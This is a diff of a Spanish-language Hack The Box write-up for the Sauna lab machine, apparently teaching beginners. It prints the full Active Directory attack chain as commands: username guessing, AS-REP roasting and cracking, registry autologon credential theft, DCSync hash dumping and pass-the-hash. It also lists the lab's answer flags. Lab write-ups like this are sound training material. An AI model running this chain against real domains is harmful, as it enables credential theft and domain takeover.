@@ -1,97 +1,50 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="referrer" content="strict-origin-when-cross-origin">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="dark">
-<meta name="theme-color" content="#0b0a1a">
-<meta name="author" content="Sebastián Latorre Muñoz">
-<title>Sauna · HTB · Guía para principiantes // iphobiuss</title>
-<meta name="description" content="Writeup y guía para principiantes de la máquina Sauna (Hack The Box): segunda Active Directory. Enumeración de usuarios desde la web, AS-REP Roasting, credenciales de autologon en el registro, DCSync directo y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss).">
-<link rel="canonical" href="https://iphobiuss.github.io/sauna.html">
-<meta property="og:title" content="Sauna · HTB · Guía para principiantes">
-<meta property="og:description" content="Segunda Active Directory: de los nombres de una web a Domain Admin, con dos vías que Forest no tenía.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://iphobiuss.github.io/sauna.html">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' shape-rendering='crispEdges'%3E%3Crect width='24' height='24' fill='%230b0a1a'/%3E%3Cg fill='%2339ff14'%3E%3Crect x='8' y='3' width='8' height='2'/%3E%3Crect x='7' y='5' width='2' height='4'/%3E%3Crect x='15' y='5' width='2' height='4'/%3E%3Crect x='5' y='9' width='14' height='12'/%3E%3C/g%3E%3Cg fill='%230b0a1a'%3E%3Crect x='11' y='12' width='2' height='4'/%3E%3Crect x='10' y='16' width='4' height='2'/%3E%3C/g%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/base.css">
-<link rel="stylesheet" href="assets/css/writeup.css">
-<style>
-  :root{--machine:var(--cyan);}
-</style>
-</head>
-<body>
-<a class="skip" href="#contenido">Saltar al contenido</a>
-<div class="crt"></div>
-
-<div class="topbar">
-<nav aria-label="Navegación">
-  <span class="brand"><b>iphobiuss</b>::offsec</span>
-  <span class="links">
-    <a href="index.html">← KNOWLEDGE BASE</a>
-    <a href="forest.html">FOREST</a>
-    <a href="#recon">RECON</a><a href="#users">USUARIOS</a><a href="#asrep">AS-REP</a>
-    <a href="#foothold">FOOTHOLD</a><a href="#autologon">AUTOLOGON</a><a href="#dcsync">DCSYNC</a><a href="#tasks">TASKS</a><a href="#takeaways">TAKEAWAYS</a>
-  </span>
-</nav>
-</div>
-
-<main id="contenido">
-<header>
-  <div class="hero">
-    <div class="prompt mono"><span class="g">iphobiuss@offsec</span>:<span class="c">~</span>$ ./pwn --box sauna --domain egotistical-bank.local</div>
-    <h1 class="pixel">SAUNA</h1>
-    <div class="meta">
+<!doctype html>
+<html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="color-scheme" content="dark"><meta name="theme-color" content="#0b0d15"><meta name="referrer" content="strict-origin-when-cross-origin"><meta name="author" content="Sebastián Latorre Muñoz">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-fFROwoB+mqK5oiFUlURznkw/dYTRtLz9gtsNkxgbWic='; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'self'">
+<title>Sauna · Guía HTB // iphobiuss</title><meta name="description" content="Writeup y guía para principiantes de la máquina Sauna (Hack The Box): segunda Active Directory. Enumeración de usuarios desde la web, AS-REP Roasting, credenciales de autologon en el registro, DCSync directo y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss)."><link rel="canonical" href="https://iphobiuss.github.io/sauna.html"><meta property="og:title" content="Sauna · Guía HTB"><meta property="og:description" content="Writeup y guía para principiantes de la máquina Sauna (Hack The Box): segunda Active Directory. Enumeración de usuarios desde la web, AS-REP Roasting, credenciales de autologon en el registro, DCSync directo y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss)."><meta property="og:type" content="article"><meta property="og:url" content="https://iphobiuss.github.io/sauna.html"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Sauna · Guía HTB"><meta name="twitter:description" content="Writeup y guía para principiantes de la máquina Sauna (Hack The Box): segunda Active Directory. Enumeración de usuarios desde la web, AS-REP Roasting, credenciales de autologon en el registro, DCSync directo y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss)."><link rel="icon" href="assets/img/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="assets/css/site.css"><script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "name": "Sauna · Guía HTB", "description": "Writeup y guía para principiantes de la máquina Sauna (Hack The Box): segunda Active Directory. Enumeración de usuarios desde la web, AS-REP Roasting, credenciales de autologon en el registro, DCSync directo y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss).", "url": "https://iphobiuss.github.io/sauna.html", "inLanguage": "es", "author": {"@type": "Person", "name": "Sebastián Latorre Muñoz", "url": "https://iphobiuss.github.io/"}, "headline": "Sauna · Guía HTB", "dateModified": "2026-09-08"}</script><script src="assets/js/site.js" defer></script></head>
+<body data-page="sauna"><a class="skip" href="#contenido">Saltar al contenido</a>
+ <header class="site-header"><div class="header-inner"><a class="brand" href="index.html">iphobiuss<span>::offsec</span></a>
+ <nav class="site-nav" id="site-nav" aria-label="Navegación principal"><a href="index.html">Inicio</a><a href="guias.html" aria-current="page">Guías</a><a href="tecnicas.html">Técnicas</a><a href="herramientas.html">Herramientas</a><a href="proyectos.html">Proyectos</a></nav>
+ <div class="header-tools"><a class="icon-button" href="buscar.html" aria-label="Buscar en el sitio">Buscar</a><button type="button" class="icon-button retro-toggle js-only" data-retro-toggle aria-pressed="false" hidden>Efectos retro</button><button type="button" class="icon-button menu-toggle" aria-controls="site-nav" aria-expanded="false" hidden>Menú</button></div></div><div class="reading-progress" aria-hidden="true"></div></header><main class="site-main" id="contenido" tabindex="-1"><div class="page-head"><div class="shell"><p class="eyebrow"><a href="guias.html">Guías</a> / 05 · Windows / AD</p><h1>SAUNA</h1><div class="meta">
       <span class="badge b1">HTB</span>
       <span class="badge b2">WINDOWS</span>
       <span class="badge b3">EASY</span>
       <span class="badge b4">ACTIVE DIRECTORY</span>
       <span class="badge b5">DCSYNC</span>
     </div>
-    <p class="pitch">Guía para principiantes de <b>Sauna</b>, la <b>#5</b> de la serie y la <b>segunda de Active Directory</b>. Refuerza el paradigma de <a href="forest.html">Forest</a> (AS-REP Roasting, DCSync, Pass-the-Hash) pero llega al mismo destino, Domain Admin, por un camino totalmente distinto. Trae dos técnicas nuevas: <b>sacar usuarios desde la web</b> cuando el SMB anónimo no los da, y <b>credenciales de autologon en el registro</b> de Windows.</p>
-
-    <div class="chain">
-      <div class="lnk" style="--acc:var(--cyan)"><div class="n">01</div><div class="t"><b>RECON</b><br>DC + web (puerto 80)</div></div>
-      <div class="lnk" style="--acc:var(--amber)"><div class="n">02</div><div class="t"><b>USUARIOS</b><br>web → usernames</div></div>
-      <div class="lnk" style="--acc:var(--magenta)"><div class="n">03</div><div class="t"><b>AS-REP</b><br>fsmith → Thestrokes23</div></div>
-      <div class="lnk" style="--acc:var(--green)"><div class="n">04</div><div class="t"><b>AUTOLOGON</b><br>registro → svc_loanmgr</div></div>
-      <div class="lnk" style="--acc:var(--violet)"><div class="n">05</div><div class="t"><b>DCSYNC</b><br>directo → PtH → root</div></div>
-    </div>
-  </div>
-</header>
-
-<div class="intro">
+    <div class="article-meta"><time datetime="2026-09-08">Edición: 8 sep 2026</time><span>8 min de lectura aprox.</span><span>Easy</span></div><p>Guía para principiantes de <b>Sauna</b>, la <b>#5</b> de la serie y la <b>segunda de Active Directory</b>. Refuerza el paradigma de <a href="forest.html">Forest</a> (AS-REP Roasting, DCSync, Pass-the-Hash) pero llega al mismo destino, Domain Admin, por un camino totalmente distinto. Trae dos técnicas nuevas: <b>sacar usuarios desde la web</b> cuando el SMB anónimo no los da, y <b>credenciales de autologon en el registro</b> de Windows.</p></div></div><div class="shell article-layout"><aside class="article-toc"><span class="toc-label">En esta guía</span><nav aria-label="Índice de la guía"><a href="#recon">01 · RECONOCIMIENTO</a><a href="#users">02 · USUARIOS DESDE LA WEB</a><a href="#asrep">03 · AS-REP ROASTING</a><a href="#foothold">04 · FOOTHOLD · WINRM</a><a href="#autologon">05 · AUTOLOGON EN EL REGISTRO</a><a href="#dcsync">06 · DCSYNC + PASS-THE-HASH</a><a href="#tasks">TASKS · GUIDED MODE</a><a href="#takeaways">MISMO DESTINO, OTRO CAMINO</a></nav></aside><div class="article-content"><details class="mobile-toc"><summary>En esta guía</summary><nav aria-label="Índice móvil"><a href="#recon">01 · RECONOCIMIENTO</a><a href="#users">02 · USUARIOS DESDE LA WEB</a><a href="#asrep">03 · AS-REP ROASTING</a><a href="#foothold">04 · FOOTHOLD · WINRM</a><a href="#autologon">05 · AUTOLOGON EN EL REGISTRO</a><a href="#dcsync">06 · DCSYNC + PASS-THE-HASH</a><a href="#tasks">TASKS · GUIDED MODE</a><a href="#takeaways">MISMO DESTINO, OTRO CAMINO</a></nav></details><div class="notice">
   <b>VPN:</b> Sauna está en Machines, así que se usa la VPN normal (no la de Starting Point que pedía <a href="vaccine.html">Vaccine</a>). El flujo de conexión y el mapeo del dominio en <span class="mono">/etc/hosts</span> son los mismos de <a href="forest.html">Forest</a> (ver <a href="setup.html">00 · Setup</a>). En esta guía la IP objetivo es <span class="mono">10.129.62.219</span> y el dominio <span class="mono">EGOTISTICAL-BANK.LOCAL</span>; la tuya será distinta.
 </div>
 
-<!-- RECON -->
-<section id="recon" style="--acc:var(--cyan)">
+<details class="spoiler"><summary>Resumen del recorrido · contiene spoilers</summary><div class="chain">
+      <div class="lnk"><div class="n">01</div><div class="t"><b>RECON</b><br>DC + web (puerto 80)</div></div>
+      <div class="lnk"><div class="n">02</div><div class="t"><b>USUARIOS</b><br>web → usernames</div></div>
+      <div class="lnk"><div class="n">03</div><div class="t"><b>AS-REP</b><br>fsmith → Thestrokes23</div></div>
+      <div class="lnk"><div class="n">04</div><div class="t"><b>AUTOLOGON</b><br>registro → svc_loanmgr</div></div>
+      <div class="lnk"><div class="n">05</div><div class="t"><b>DCSYNC</b><br>directo → PtH → root</div></div>
+    </div>
+  </details><details class="environment"><summary>Entorno y versiones documentadas</summary><ul><li>Kali Linux y VirtualBox: versiones no especificadas en la guía original.</li><li>Objetivo: Windows Server 2019.</li></ul><p>Las versiones indicadas provienen del texto original. La fecha de edición identifica la revisión de esta página; no implica que se haya repetido el laboratorio.</p></details><div class="guide-controls js-only" hidden><span>Modo de lectura</span><button class="small-button" type="button" data-guide-mode="full" aria-pressed="true">Guía completa</button><button class="small-button" type="button" data-guide-mode="hints" aria-pressed="false">Solo pistas</button><button class="small-button print-button" type="button" data-print>Imprimir / PDF</button></div><section id="recon">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">01 · RECONOCIMIENTO</h2></div>
     <div class="sec-focus">Un DC como Forest, más una web: dos superficies de ataque.</div>
-    <pre><span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.62.219
-<span class="k">nmap</span> -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap/detail 10.129.62.219</pre>
-    <p class="f"><code class="ic">ttl=127</code> sugiere Windows (pista, se confirma con el fingerprint). La huella de AD conocida de Forest (Kerberos 88, LDAP 389/636, SMB 445, DNS 53, WinRM 5985) confirma un <b>Domain Controller</b>. El <code class="ic">-sCV</code> revela el dominio: <b>EGOTISTICAL-BANK.LOCAL</b>, host <b>SAUNA</b>, Windows Server 2019.</p>
+    <div class="hint"><b>PISTA</b>Identifica los puertos abiertos, sus servicios y versiones. Anota una hipótesis de entrada por cada servicio.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.62.219
+<span class="k">nmap</span> -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap/detail 10.129.62.219</code></pre>
+    </figure><p class="f"><code class="ic">ttl=127</code> sugiere Windows (pista, se confirma con el fingerprint). La huella de AD conocida de Forest (Kerberos 88, LDAP 389/636, SMB 445, DNS 53, WinRM 5985) confirma un <b>Domain Controller</b>. El <code class="ic">-sCV</code> revela el dominio: <b>EGOTISTICAL-BANK.LOCAL</b>, host <b>SAUNA</b>, Windows Server 2019.</p>
     <p class="f">Mapea el dominio en <code class="ic">/etc/hosts</code> para que Kerberos resuelva el nombre (habitual en labs):</p>
-    <pre><span class="k">sudo</span> sh -c 'echo "10.129.62.219 EGOTISTICAL-BANK.LOCAL sauna.egotistical-bank.local SAUNA" &gt;&gt; /etc/hosts'</pre>
-    <div class="why"><b>LA DIFERENCIA CON FOREST: EL PUERTO 80</b>Aquí, además de todos los servicios de AD, hay una <b>web</b> (IIS, "Egotistical Bank"). Eso es una segunda superficie, y en Sauna resulta ser la puerta de entrada, porque el SMB anónimo no coopera como en Forest.</div>
-  </div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">sudo</span> sh -c 'echo "10.129.62.219 EGOTISTICAL-BANK.LOCAL sauna.egotistical-bank.local SAUNA" &gt;&gt; /etc/hosts'</code></pre>
+    </figure><div class="why"><b>LA DIFERENCIA CON FOREST: EL PUERTO 80</b>Aquí, además de todos los servicios de AD, hay una <b>web</b> (IIS, "Egotistical Bank"). Eso es una segunda superficie, y en Sauna resulta ser la puerta de entrada, porque el SMB anónimo no coopera como en Forest.</div>
+  </details></div>
 </section>
 
-<!-- USUARIOS -->
-<section id="users" style="--acc:var(--amber)">
+<section id="users">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">02 · USUARIOS DESDE LA WEB</h2></div>
     <div class="sec-focus">La técnica nueva de Sauna: de nombres de personas a nombres de usuario.</div>
 
-    <h3 class="step">El SMB anónimo no da usuarios</h3>
-    <pre><span class="k">netexec</span> smb 10.129.62.219 -u '' -p '' --users
-<span class="cmt"># conecta (Null Auth:True) pero NO devuelve usuarios (a diferencia de Forest)</span></pre>
-    <p class="f">Sin lista de usuarios no hay AS-REP Roasting. Hay que conseguirla de otra fuente, y una web corporativa suele listar a su gente.</p>
+    <div class="hint"><b>PISTA</b>Los nombres de personas publicados en una web pueden ayudarte a proponer nombres de cuenta.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><h3 class="step">El SMB anónimo no da usuarios</h3>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">netexec</span> smb 10.129.62.219 -u '' -p '' --users
+<span class="cmt"># conecta (Null Auth:True) pero NO devuelve usuarios (a diferencia de Forest)</span></code></pre>
+    </figure><p class="f">Sin lista de usuarios no hay AS-REP Roasting. Hay que conseguirla de otra fuente, y una web corporativa suele listar a su gente.</p>
 
     <h3 class="step">Nombres de empleados en la web</h3>
     <p class="f">Navegando el sitio (<code class="ic">http://10.129.62.219</code>), la página <code class="ic">about.html</code> tiene una sección "Meet The Team" con seis empleados: <b>Fergus Smith, Hugo Bear, Steven Kerb, Shaun Coins, Bowie Taylor, Sophie Driver</b>. (Incluso hay un chiste en el HTML: "so many bank account managers but only one security manager".)</p>
@@ -103,89 +56,84 @@
 
     <h3 class="step">Generar y probar candidatos</h3>
     <p class="f">Crea un <code class="ic">users.txt</code> con las variantes de cada nombre y pásalo a <code class="ic">GetNPUsers</code>. Este comando tiene doble propósito: descarta los usuarios que no existen (<code class="ic">KDC_ERR_C_PRINCIPAL_UNKNOWN</code>) y, si alguno existe y es AS-REP roasteable, suelta el hash.</p>
-    <pre><span class="k">impacket-GetNPUsers</span> EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
-<span class="cmt"># de todos los candidatos, solo fsmith existe... y suelta un $krb5asrep$</span></pre>
-    <p class="f">Resultado: la convención del dominio es <b>primera letra + apellido</b> (<code class="ic">fsmith</code>), y ese usuario tiene la pre-autenticación de Kerberos desactivada. Doble premio.</p>
-  </div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">impacket-GetNPUsers</span> EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
+<span class="cmt"># de todos los candidatos, solo fsmith existe... y suelta un $krb5asrep$</span></code></pre>
+    </figure><p class="f">Resultado: la convención del dominio es <b>primera letra + apellido</b> (<code class="ic">fsmith</code>), y ese usuario tiene la pre-autenticación de Kerberos desactivada. Doble premio.</p>
+  </details></div>
 </section>
 
-<!-- AS-REP -->
-<section id="asrep" style="--acc:var(--magenta)">
+<section id="asrep">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">03 · AS-REP ROASTING</h2></div>
     <div class="sec-focus">Idéntico a Forest: pedir el hash sin autenticarse y romperlo offline.</div>
-    <p class="f">Recordatorio del concepto (ver <a href="forest.html#asrep">Forest</a>): una cuenta sin pre-autenticación de Kerberos entrega información cifrada derivada de su contraseña sin que te autentiques. Se captura y se crackea offline.</p>
-    <pre><span class="k">impacket-GetNPUsers</span> EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt | grep '\$krb5asrep\$' &gt; hash.txt
-<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   <span class="cmt"># -&gt; Thestrokes23</span></pre>
-    <p class="f">Credenciales conseguidas por la vía web: <b><code class="ic">fsmith</code> / <code class="ic">Thestrokes23</code></b>.</p>
-  </div>
+    <div class="hint"><b>PISTA</b>Investiga si todas las cuentas exigen preautenticación y qué respuesta entrega el servicio cuando no la requieren.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><p class="f">Recordatorio del concepto (ver <a href="forest.html#asrep">Forest</a>): una cuenta sin pre-autenticación de Kerberos entrega información cifrada derivada de su contraseña sin que te autentiques. Se captura y se crackea offline.</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">impacket-GetNPUsers</span> EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt | grep '\$krb5asrep\$' &gt; hash.txt
+<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   <span class="cmt"># -&gt; Thestrokes23</span></code></pre>
+    </figure><p class="f">Credenciales conseguidas por la vía web: <b><code class="ic">fsmith</code> / <code class="ic">Thestrokes23</code></b>.</p>
+  </details></div>
 </section>
 
-<!-- FOOTHOLD -->
-<section id="foothold" style="--acc:var(--green)">
+<section id="foothold">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">04 · FOOTHOLD · WINRM</h2></div>
     <div class="sec-focus">Validar y entrar, el reflejo de Forest.</div>
-    <pre><span class="k">netexec</span> smb 10.129.62.219 -u fsmith -p Thestrokes23     <span class="cmt"># [+] válidas</span>
+    <div class="hint"><b>PISTA</b>Valida las credenciales conseguidas en un servicio de acceso remoto disponible.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">netexec</span> smb 10.129.62.219 -u fsmith -p Thestrokes23     <span class="cmt"># [+] válidas</span>
 <span class="k">netexec</span> winrm 10.129.62.219 -u fsmith -p Thestrokes23   <span class="cmt"># (Pwn3d!) = entra por WinRM</span>
-<span class="k">evil-winrm</span> -i 10.129.62.219 -u fsmith -p Thestrokes23</pre>
-    <pre><span class="cmt"># dentro de la shell:</span>
-<span class="k">type</span> C:\Users\FSmith\Desktop\user.txt   <span class="cmt"># user flag</span></pre>
-  </div>
+<span class="k">evil-winrm</span> -i 10.129.62.219 -u fsmith -p Thestrokes23</code></pre>
+    </figure><figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="cmt"># dentro de la shell:</span>
+<span class="k">type</span> C:\Users\FSmith\Desktop\user.txt   <span class="cmt"># user flag</span></code></pre>
+  </figure></details></div>
 </section>
 
-<!-- AUTOLOGON -->
-<section id="autologon" style="--acc:var(--green)">
+<section id="autologon">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">05 · AUTOLOGON EN EL REGISTRO</h2></div>
     <div class="sec-focus">La segunda técnica nueva: credenciales en texto claro escondidas en Windows.</div>
 
-    <div class="fcard green">
+    <div class="hint"><b>PISTA</b>Busca dónde guarda Windows la configuración del inicio de sesión automático.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard green">
       <h4>▚ ¿Qué es el autologon y por qué filtra credenciales?</h4>
       <p>A veces un Windows se configura para <b>iniciar sesión automáticamente</b> al arrancar, sin pedir contraseña. Cuando eso pasa, las credenciales del usuario quedan guardadas en el <b>registro</b>, a veces en <b>texto claro</b>. Es una de las primeras cosas que revisar tras conseguir shell en un Windows.</p>
     </div>
 
     <h3 class="step">Consultar el registro (Winlogon)</h3>
-    <pre><span class="k">reg</span> query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">reg</span> query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 <span class="cmt"># DefaultUserName  -&gt; EGOTISTICALBANK\svc_loanmanager</span>
-<span class="cmt"># DefaultPassword  -&gt; Moneymakestheworldgoround!</span></pre>
-    <p class="f">Segundo par de credenciales, por una vía nueva. El prefijo <code class="ic">svc_</code> delata una cuenta de servicio, como svc-alfresco en Forest.</p>
+<span class="cmt"># DefaultPassword  -&gt; Moneymakestheworldgoround!</span></code></pre>
+    </figure><p class="f">Segundo par de credenciales, por una vía nueva. El prefijo <code class="ic">svc_</code> delata una cuenta de servicio, como svc-alfresco en Forest.</p>
 
     <div class="why"><b>OJO: EL NOMBRE DEL REGISTRO VS EL REAL</b>El registro dice <code class="ic">svc_loanmanager</code>, pero la cuenta que autentica de verdad en el dominio es <code class="ic">svc_loanmgr</code> (el nombre está abreviado en el sistema). Si una variante no valida, prueba la otra. Se confirma con <code class="ic">netexec smb ... -u svc_loanmgr -p 'Moneymakestheworldgoround!'</code>.</div>
-  </div>
+  </details></div>
 </section>
 
-<!-- DCSYNC -->
-<section id="dcsync" style="--acc:var(--violet)">
+<section id="dcsync">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">06 · DCSYNC + PASS-THE-HASH</h2></div>
     <div class="sec-focus">Mismo final que Forest, pero sin la cadena de permisos.</div>
 
-    <div class="fcard">
+    <div class="hint"><b>PISTA</b>Los permisos sobre la replicación del directorio pueden ser relevantes aunque la cuenta no sea administradora.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard">
       <h4>▚ DCSync directo</h4>
       <p>En Forest hubo que <b>concederse</b> el DCSync abusando de una cadena de ACLs (Account Operators, GenericAll, WriteDacl). En Sauna, <code class="ic">svc_loanmgr</code> <b>ya tiene de fábrica</b> los derechos de replicación sobre el dominio (BloodHound los muestra como <code class="ic">GetChanges</code> y <code class="ic">GetChangesAll</code>). Así que el DCSync es directo: no hay pasos intermedios.</p>
     </div>
 
     <h3 class="step">Volcar los hashes del dominio</h3>
-    <pre><span class="k">impacket-secretsdump</span> egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.62.219</pre>
-    <p class="f">El <code class="ic">rpc_s_access_denied</code> inicial es el mismo aviso inofensivo de Forest. Debajo, vuelca todos los hashes. La línea que importa (RID <code class="ic">500</code> = Administrator):</p>
-    <pre>Administrator:500:aad3b435...:<span class="o">823452073d75b9d1cf70ebdf86c7f98e</span>:::</pre>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">impacket-secretsdump</span> egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.62.219</code></pre>
+    </figure><p class="f">El <code class="ic">rpc_s_access_denied</code> inicial es el mismo aviso inofensivo de Forest. Debajo, vuelca todos los hashes. La línea que importa (RID <code class="ic">500</code> = Administrator):</p>
+    <figure class="code-block" data-code-kind="output"><figcaption><span>Salida de ejemplo</span></figcaption><pre tabindex="0" aria-label="Salida de ejemplo; desplazamiento horizontal disponible"><code>Administrator:500:aad3b435...:<span class="o">823452073d75b9d1cf70ebdf86c7f98e</span>:::</code></pre>
 
-    <h3 class="step">Pass-the-Hash como Administrator</h3>
+    </figure><h3 class="step">Pass-the-Hash como Administrator</h3>
     <p class="f">Sin crackear nada: te autenticas con el hash NTLM directo (<code class="ic">-H</code> en vez de <code class="ic">-p</code>).</p>
-    <pre><span class="k">evil-winrm</span> -i 10.129.62.219 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
-<span class="k">type</span> C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># root flag</span></pre>
-    <p class="f"><b>Domain Admin. Sauna comprometida por completo.</b></p>
-  </div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">evil-winrm</span> -i 10.129.62.219 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+<span class="k">type</span> C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># root flag</span></code></pre>
+    </figure><p class="f"><b>Domain Admin. Sauna comprometida por completo.</b></p>
+  </details></div>
 </section>
 
-<!-- TASKS -->
-<section id="tasks" style="--acc:var(--amber)">
+<section id="tasks">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">TASKS · GUIDED MODE</h2></div>
     <div class="sec-focus">Las flags son de una instancia concreta. En tu máquina serán distintas.</div>
-    <div class="tblwrap"><table>
-      <tr><th>Task</th><th>Respuesta</th></tr>
+    <details class="spoiler"><summary>Mostrar respuestas del laboratorio</summary><div class="tblwrap"><table>
+      <tr><th scope="col">Task</th><th scope="col">Respuesta</th></tr>
       <tr><td>HTML que revela los nombres de los empleados</td><td class="ans">about.html</td></tr>
       <tr><td>Usuario con la pre-autenticación de Kerberos deshabilitada</td><td class="ans">fsmith</td></tr>
       <tr><td>Formato del hash AS-REP (del 1er al 3er $, incluidos)</td><td class="ans">$krb5asrep$23$</td></tr>
@@ -198,16 +146,15 @@
       <tr><td>User flag (escritorio de fsmith)</td><td><code>f77a8d06c229a1a80f78d23e9d41f77a</code></td></tr>
       <tr><td>Root flag (escritorio de Administrator)</td><td><code>6014ff7af65ef38cf8d0a4a20e3bae9b</code></td></tr>
     </table></div>
-  </div>
+  </details></div>
 </section>
 
-<!-- TAKEAWAYS -->
-<section id="takeaways" style="--acc:var(--green)">
+<section id="takeaways">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">MISMO DESTINO, OTRO CAMINO</h2></div>
     <div class="sec-focus">Por qué una segunda AD consolida: mismos conceptos, vías nuevas.</div>
     <div class="tblwrap"><table>
-      <tr><th>Fase</th><th>Forest</th><th>Sauna</th></tr>
+      <tr><th scope="col">Fase</th><th scope="col">Forest</th><th scope="col">Sauna</th></tr>
       <tr><td>Lista de usuarios</td><td>SMB anónimo</td><td><b>Web → nombres → usernames</b></td></tr>
       <tr><td>Entrada</td><td>AS-REP a svc-alfresco</td><td>AS-REP a fsmith (username deducido)</td></tr>
       <tr><td>2ª credencial</td><td>(no hubo)</td><td><b>Autologon en el registro</b></td></tr>
@@ -224,18 +171,4 @@
     </ul>
   </div>
 </section>
-</main>
-
-<footer>
